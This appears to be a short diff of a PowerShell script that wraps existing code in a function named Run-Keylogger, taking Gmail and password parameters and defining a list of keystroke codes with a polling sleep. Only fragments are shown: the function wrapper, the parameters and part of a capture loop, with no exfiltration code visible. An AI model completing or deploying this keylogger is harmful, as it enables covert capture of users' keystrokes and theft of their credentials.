@@ -1,3 +1,5 @@
+function Run-Keylogger {
+
 param($gmail,$password)
 
 $numValues = 96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,32
@@ -136,4 +138,5 @@ $caps = 0
 }
 }
 Start-Sleep -m 20
+}
 }
